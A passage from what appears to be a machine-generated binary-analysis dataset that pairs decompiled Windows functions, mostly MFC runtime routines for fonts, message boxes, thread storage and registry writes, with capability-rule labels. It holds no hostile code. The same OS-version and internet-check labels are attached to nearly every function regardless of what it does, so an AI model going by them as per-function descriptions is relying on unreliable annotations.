        "decompiled_code": "\nuint __cdecl fcn.004190b3(uint lpMultiByteStr, uint arg_ch)\n\n{\n    uint uVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    ushort *puVar4;\n    uint *in_ECX;\n    int32_t iVar5;\n    int16_t iVar6;\n    int32_t iVar7;\n    uint32_t arg_8h;\n    uint lpWideCharStr;\n    ushort *var_10h;\n    uint32_t var_ch;\n    uint *hMem;\n    uint32_t var_4h;\n    \n    if (in_ECX[1] == 0) {\n        uVar1 = 0;\n    }\n    else {\n        hMem = in_ECX;\n        puVar2 = (*_sym.imp.KERNEL32.dll_GlobalLock)(*in_ECX);\n        var_4h = *(puVar2 + 2) == -1;\n        if (*(puVar2 + 2) == -1) {\n            var_ch = puVar2[3];\n        }\n        else {\n            var_ch = *puVar2;\n        }\n        var_ch = var_ch & 0x40;\n        iVar7 = (-(var_4h != 0) & 2) + 1;\n        if (var_4h == 0) {\n            *puVar2 = *puVar2 | 0x40;\n        }\n        else {\n            puVar2[3] = puVar2[3] | 0x40;\n        }\n        iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, lpMultiByteStr, 0xffffffff, &lpWideCharStr, 0x20);\n        iVar3 = iVar7 * 2 + iVar3 * 2;\n        puVar4 = fcn.00418f36(puVar2);\n        iVar5 = 0;\n        var_10h = puVar4;\n        if (var_ch != 0) {\n            iVar5 = fcn.00407ea5(puVar4 + iVar7);\n            iVar5 = iVar7 * 2 + 2 + iVar5 * 2;\n        }\n        var_ch = iVar5 + 3 + puVar4 & 0xfffffffc;\n        arg_8h = puVar4 + iVar3 + 3 & 0xfffffffc;\n        if (var_4h == 0) {\n            iVar6 = *(puVar2 + 2);\n        }\n        else {\n            iVar6 = *(puVar2 + 4);\n        }\n        if ((iVar3 != iVar5) && (iVar6 != 0)) {\n            fcn.00408520(arg_8h, var_ch, puVar2 + (hMem[1] - var_ch));\n        }\n        *var_10h = arg_ch;\n        fcn.00408520(var_10h + iVar7, &lpWideCharStr, iVar3 + iVar7 * -2);\n        hMem[1] = hMem[1] + (arg_8h - var_ch);\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*hMem);\n        hMem[2] = 0;\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 709
    },
    "004191cd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004191cd(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    char *lpMultiByteStr;\n    int32_t lpvObject;\n    uint var_24h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.GDI32.dll_GetStockObject;\n    uVar4 = 10;\n    lpMultiByteStr = \"System\";\n    iVar2 = (*_sym.imp.GDI32.dll_GetStockObject)(0x11);\n    if (iVar2 == 0) {\n        iVar2 = (*pcVar1)(0xd);\n        if (iVar2 == 0) goto code_r0x00419241;\n    }\n    iVar2 = (*_sym.imp.GDI32.dll_GetObjectA)(iVar2, 0x3c, &lpvObject);\n    if (iVar2 != 0) {\n        lpMultiByteStr = &var_24h;\n        uVar3 = (*_sym.imp.USER32.dll_GetDC)(0);\n        if (lpvObject < 0) {\n            lpvObject = -lpvObject;\n        }\n        uVar4 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(uVar3, 0x5a);\n        uVar4 = (*_sym.imp.KERNEL32.dll_MulDiv)(lpvObject, 0x48, uVar4);\n        (*_sym.imp.USER32.dll_ReleaseDC)(0, uVar3);\n    }\ncode_r0x00419241:\n    if (arg_8h == 0) {\n        arg_8h = uVar4;\n    }\n    fcn.004190b3(lpMultiByteStr, arg_8h);\n    return;\n}\n",
        "token_count": 391
    },
    "00419317": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00419317(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004077f4();\n    iVar1 = fcn.0041ab76();\n    if ((*(iVar1 + 0x1c) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.00415c8b(0x419af1);\n        iVar3 = fcn.00415c9d(0x48);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.00418d0a(0x41e280, 4, 2);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x1c) = uVar4;\n        fcn.00415c8b(uVar2);\n    }\n    uVar2 = *(iVar1 + 0x1c);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 355
    },
    "00419406": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00419406(void)\n\n{\n    uint uVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004077f4();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CDC.0;\n    *(unaff_EBP + -4) = 0;\n    if (extraout_ECX[1] != NULL) {\n        uVar1 = fcn.004193d5(extraout_ECX);\n        (*_sym.imp.GDI32.dll_DeleteDC)(uVar1);\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 201
    },
    "00419880": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00419880(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004077f4();\n    iVar1 = fcn.0041ab76();\n    if ((*(iVar1 + 0x20) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.00415c8b(0x419af1);\n        iVar3 = fcn.00415c9d(0x48);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.00418d0a(0x41e258, 4, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x20) = uVar4;\n        fcn.00415c8b(uVar2);\n    }\n    uVar2 = *(iVar1 + 0x20);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 352
    },
    "00419931": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00419931(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 4) == 0) {\n        return 0;\n    }\n    uVar1 = fcn.00419907();\n    uVar1 = (*_sym.imp.GDI32.dll_DeleteObject)(uVar1);\n    return uVar1;\n}\n",
        "token_count": 86
    },
    "00419960": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool fcn.00419960(int32_t param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t hWnd;\n    uint32_t var_4h;\n    uint lpClassName;\n    \n    if ((hWnd != 0) && (uVar1 = (*_sym.imp.USER32.dll_GetWindowLongA)(hWnd, 0xfffffff0),  (uVar1 & 0xf) == var_4h)) {\n        (*_sym.imp.USER32.dll_GetClassNameA)(hWnd, &lpClassName, 10);\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(&lpClassName, \"combobox\");\n        return iVar2 == 0;\n    }\n    return false;\n}\n",
        "token_count": 174
    },
    "00419cbe": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00419cbe(uint lpText, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint *puVar4;\n    uint var_114h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t hWnd;\n    \n    fcn.00419c90(0);\n    var_ch = fcn.00419e36(0, &hWnd);\n    if (((var_ch == 0) || (piVar1 = (*_sym.imp.USER32.dll_SendMessageA)(hWnd, 0x376, 0, 0),  piVar1 == NULL)) &&\n       (piVar1 = NULL,  in_ECX != 0)) {\n        piVar1 = in_ECX + 0x9c;\n    }\n    var_8h = 0;\n    if ((piVar1 != NULL) && (var_8h = *piVar1,  arg_10h != 0)) {\n        *piVar1 = arg_10h + 0x30000;\n    }\n    if (((arg_ch & 0xf0) == 0) && ((uVar2 = arg_ch & 0xf,  uVar2 < 2 || ((2 < uVar2 && (uVar2 < 5)))))) {\n        arg_ch = arg_ch | 0x30;\n    }\n    if (in_ECX == 0) {\n        puVar4 = &var_114h;\n        (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, &var_114h, 0x104);\n    }\n    else {\n        puVar4 = *(in_ECX + 0x78);\n    }\n    uVar3 = (*_sym.imp.USER32.dll_MessageBoxA)(var_ch, lpText, puVar4, arg_ch);\n    if (piVar1 != NULL) {\n        *piVar1 = var_8h;\n    }\n    if (hWnd != 0) {\n        (*_sym.imp.USER32.dll_EnableWindow)(hWnd, 1);\n    }\n    fcn.00419c90(1);\n    return uVar3;\n}\n",
        "token_count": 512
    },
    "00419ef5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419ef5(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    fcn.004186eb(arg_8h, &arg_8h);\n    if (arg_8h == 0) {\n        fcn.00414019();\n    }\n    *(in_ECX + 0xc) = 0;\n    *(in_ECX + 8) = arg_8h;\n    return;\n}\n",
        "token_count": 102
    },
    "00419f24": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419f24(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    uint hWnd;\n    int32_t iVar1;\n    uint uVar2;\n    \n    hWnd = fcn.00419ede(arg_ch);\n    if (*arg_8h == 0) {\n        fcn.00419a4a(hWnd, *arg_10h);\n    }\n    else {\n        iVar1 = (*_sym.imp.USER32.dll_GetWindowTextLengthA)(hWnd);\n        uVar2 = fcn.00415c63(iVar1, iVar1 + 1);\n        (*_sym.imp.USER32.dll_GetWindowTextA)(hWnd, uVar2);\n        fcn.00415c3b(0xffffffff);\n    }\n    return;\n}\n",
        "token_count": 175
    },
    "0041a04b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0041a04b(uint lpAppName, uint lpValueName, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint lpString;\n    \n    if (*(in_ECX + 0x7c) == 0) {\n        (*_sym.imp.USER32.dll_wsprintfA)(&lpString, 0x41e234, arg_10h);\n        uVar1 = (*_sym.imp.KERNEL32.dll_WritePrivateProfileStringA)(lpAppName, lpValueName, &lpString, *(in_ECX + 0x90))\n        ;\n    }\n    else {\n        uVar1 = fcn.0041b53a(lpAppName);\n        if (uVar1 != 0) {\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(uVar1, lpValueName, 0, 4, &arg_10h, 4);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(uVar1);\n            uVar1 = iVar2 == 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 260
    },
    "0041aa81": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0041aa81(void)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    code **extraout_ECX;\n    code *pcVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004077f4();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.AFX_MODULE_THREAD_STATE.0;\n    puVar1 = extraout_ECX[5];\n    *(unaff_EBP + -4) = 0;\n    if (puVar1 != NULL) {\n        (***puVar1)(1);\n    }\n    if (extraout_ECX[6] != NULL) {\n        (***extraout_ECX[6])(1);\n    }\n    if (extraout_ECX[7] != NULL) {\n        (***extraout_ECX[7])(1);\n    }\n    if (extraout_ECX[8] != NULL) {\n        (***extraout_ECX[8])(1);\n    }\n    if (extraout_ECX[9] != NULL) {\n        (***extraout_ECX[9])(1);\n    }\n    pcVar3 = extraout_ECX[0xe];\n    if (pcVar3 != NULL) {\n        while (*(pcVar3 + 0xc) != 0) {\n            uVar2 = fcn.0041406b();\n            fcn.00415cc6(uVar2);\n            pcVar3 = extraout_ECX[0xe];\n        }\n    }\n    if (extraout_ECX[0xc] != NULL) {\n        (**(*extraout_ECX[0xc] + 4))(1);\n    }\n    if (extraout_ECX[0xd] != NULL) {\n        (**(*extraout_ECX[0xd] + 4))(1);\n    }\n    if (extraout_ECX[0xe] != NULL) {\n        (**(*extraout_ECX[0xe] + 4))(1);\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 512
    },
    "0041af3b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0041af3b(int32_t param_1)\n\n{\n    if (param_1 != 0) {\n        (*_sym.imp.KERNEL32.dll_LocalFree)(param_1);\n    }\n    return;\n}\n",
        "token_count": 51
    },
    "0041b157": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b157(int32_t arg_8h, int32_t arg_ch)\n\n{\n    code **ppcVar1;\n    code *pcVar2;\n    uint *in_ECX;\n    code **ppcVar3;\n    uint var_4h;\n    \n    ppcVar1 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*in_ECX);\n    if (ppcVar1 == NULL) {\n        ppcVar1 = fcn.0041af1d(0x10);\n        if (ppcVar1 == NULL) {\n            ppcVar1 = NULL;\n        }\n        else {\n            *ppcVar1 = vtable.CThreadData.0;\n        }\n        ppcVar1[2] = NULL;\n        ppcVar1[3] = NULL;\n        ppcVar3 = ppcVar1 + 2;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(in_ECX + 7);\n        fcn.0041aec4(ppcVar1);\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(in_ECX + 7);\n    }\n    else {\n        ppcVar3 = ppcVar1 + 2;\n        if ((arg_8h < *ppcVar3) || (arg_ch == 0)) goto code_r0x0041b22e;\n    }\n    if (ppcVar1[3] == NULL) {\n        pcVar2 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0, in_ECX[3] << 2);\n    }\n    else {\n        pcVar2 = (*_sym.imp.KERNEL32.dll_LocalReAlloc)(ppcVar1[3], in_ECX[3] << 2, 2);\n    }\n    ppcVar1[3] = pcVar2;\n    if (pcVar2 == NULL) {\n        fcn.00414000();\n    }\n    fcn.004079b0(ppcVar1[3] + *ppcVar3 * 4, 0, (*ppcVar3 * 0x3fffffff + in_ECX[3]) * 4);\n    *ppcVar3 = in_ECX[3];\n    (*_sym.imp.KERNEL32.dll_TlsSetValue)(*in_ECX, ppcVar1);\ncode_r0x0041b22e:\n    *(ppcVar1[3] + arg_8h * 4) = arg_ch;\n    return;\n}\n",
        "token_count": 539
    },
    "0041b25d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b25d(uint *arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    bool bVar2;\n    uint *in_ECX;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar3 = 1;\n    bVar2 = true;\n    if (1 < arg_8h[2]) {\n        do {\n            if ((arg_ch == 0) || (*(in_ECX[4] + 4 + iVar3 * 8) == arg_ch)) {\n                puVar1 = *(arg_8h[3] + iVar3 * 4);\n                if (puVar1 != NULL) {\n                    (***puVar1)(1);\n                }\n                *(arg_8h[3] + iVar3 * 4) = 0;\n            }\n            else if (*(arg_8h[3] + iVar3 * 4) != 0) {\n                bVar2 = false;\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < arg_8h[2]);\n        if (!bVar2) {\n            return;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(in_ECX + 7);\n    fcn.0041aed7(arg_8h);\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(in_ECX + 7);\n    (*_sym.imp.KERNEL32.dll_LocalFree)(arg_8h[3]);\n    if (arg_8h != NULL) {\n        (***arg_8h)(1);\n    }\n    (*_sym.imp.KERNEL32.dll_TlsSetValue)(*in_ECX, 0);\n    return;\n}\n",
        "token_count": 375
    },
    "0041b2f6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041b2f6(uint *param_1, int32_t param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint unaff_retaddr;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(param_1 + 7);\n    if (param_2 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*param_1);\n        if (iVar2 != 0) {\n            fcn.0041b25d(iVar2, unaff_retaddr);\n        }\n    }\n    else {\n        iVar2 = param_1[5];\n        while (iVar2 != 0) {\n            iVar1 = *(iVar2 + 4);\n            fcn.0041b25d(iVar2, param_3);\n            iVar2 = iVar1;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(param_1 + 7);\n    return;\n}\n",
        "token_count": 223
    },
    "0041b34f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041b376)\n\nint32_t __fastcall fcn.0041b34f(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    code *unaff_retaddr;\n    \n    if (*param_1 == 0) {\n        if (*0x42fa14 == NULL) {\n            *0x42fa14 = fcn.0041af4f();\n        }\n        iVar1 = fcn.0041afe8();\n        *param_1 = iVar1;\n    }\n    iVar1 = *param_1;\n    iVar2 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(**0x42fa14);\n    if ((iVar2 == 0) || (*(iVar2 + 8) <= iVar1)) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = *(*(iVar2 + 0xc) + iVar1 * 4);\n    }\n    if (iVar1 == 0) {\n        iVar1 = (*unaff_retaddr)();\n        fcn.0041b157(*param_1, iVar1);\n    }\n    return iVar1;\n}\n",
        "token_count": 259
    },
    "0041b43f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041b43f(int32_t *param_1)\n\n{\n    uint var_4h;\n    \n    if (*param_1 != 0) {\n        if (*param_1 != NULL) {\n            (****param_1)(1);\n        }\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "0041b5f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "get OS version"
        ],
        "decompiled_code": "\nint32_t fcn.0041b5f0(void)\n\n{\n    uint32_t uVar1;\n    \n    if (*0x42fd7c == 0) {\n        *0x42fd7c = 1;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n        if ((uVar1 < 4) && ((uVar1 & 0x80000000) != 0)) {\n            *0x42fd78 = 1;\n        }\n        else {\n            *0x42fd78 = 0;\n            (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x42fbc8);\n        }\n    }\n    return *0x42fd7c;\n}\n",
        "token_count": 157
    },
    "0041b683": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0041b683(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    \n    if (*0x42fd7c == 0) {\n        fcn.0041b5f0();\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_EnterCriticalSection;\n    if (*0x42fd78 == 0) {\n        piVar1 = param_1 * 4 + 0x42fb80;\n        if (*(param_1 * 4 + 0x42fb80) == 0) {\n            (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x42fbc8);\n            if (*piVar1 == 0) {\n                (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(param_1 * 0x18 + 0x42fbe0);\n                *piVar1 = *piVar1 + 1;\n            }\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x42fbc8);\n        }\n        (*pcVar2)(param_1 * 0x18 + 0x42fbe0);\n    }\n    return;\n}\n",
        "token_count": 255
    },
    "0041b6f3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0041b6f3(int32_t param_1)\n\n{\n    if (*0x42fd78 == 0) {\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(param_1 * 0x18 + 0x42fbe0);\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "0041b73e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0041b73e(void)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n    if (*0x42fddc != 0) {\n        *0x42fd80 = (*_sym.imp.USER32.dll_GetSystemMetrics)(2);\n        *0x42fd80 = *0x42fd80 + 1;\n        *0x42fd84 = (*pcVar1)(3);\n        *0x42fd84 = *0x42fd84 + 1;\n        *0x42fde8 = 1;\n    }\n    return;\n}\n",
        "token_count": 140
    },
    "0041b922": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0041b922(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint unaff_ESI;\n    uint unaff_retaddr;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_SetErrorMode;\n    uVar2 = (*_sym.imp.KERNEL32.dll_SetErrorMode)(0);\n    (*pcVar1)(uVar2 | 0x8001);\n    iVar3 = fcn.0041ab50();\n    *(iVar3 + 8) = unaff_ESI;\n    *(iVar3 + 0xc) = unaff_ESI;\n    iVar3 = fcn.0041ab50();\n    iVar3 = *(iVar3 + 4);\n    if (iVar3 != 0) {\n        *(iVar3 + 0x68) = unaff_ESI;\n        *(iVar3 + 0x6c) = unaff_retaddr;\n        *(iVar3 + 0x70) = param_1;\n        *(iVar3 + 0x74) = param_2;\n        fcn.0041b985();\n    }\n    iVar3 = fcn.0041ab50();\n    if (*(iVar3 + 0x14) == '\\0') {\n        fcn.00414572();\n    }\n    return 1;\n}\n",
        "token_count": 300
    },
    "0041b985": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041b985(int32_t param_1)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint var_30ch;\n    uint lpFilename;\n    uint var_108h;\n    uchar *var_4h;\n    \n    iVar2 = fcn.0041ab50();\n    *(iVar2 + 8) = *(param_1 + 0x68);\n    *(iVar2 + 0xc) = *(param_1 + 0x68);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(*(param_1 + 0x68), &lpFilename, 0x104);\n    var_4h = fcn.00408855(&lpFilename, 0x2e);\n    *var_4h = 0;\n    fcn.0041baa2(&lpFilename, &var_108h, 0x104);\n    if (*(param_1 + 0x88) == 0) {\n        uVar3 = fcn.00407813(&var_108h);\n        *(param_1 + 0x88) = uVar3;\n    }\n    if (*(param_1 + 0x78) == 0) {\n        iVar4 = fcn.0041895b(0xe000, &var_30ch, 0x100);\n        if (iVar4 == 0) {\n            puVar5 = *(param_1 + 0x88);\n        }\n        else {\n            puVar5 = &var_30ch;\n        }\n        uVar3 = fcn.00407813(puVar5);\n        *(param_1 + 0x78) = uVar3;\n    }\n 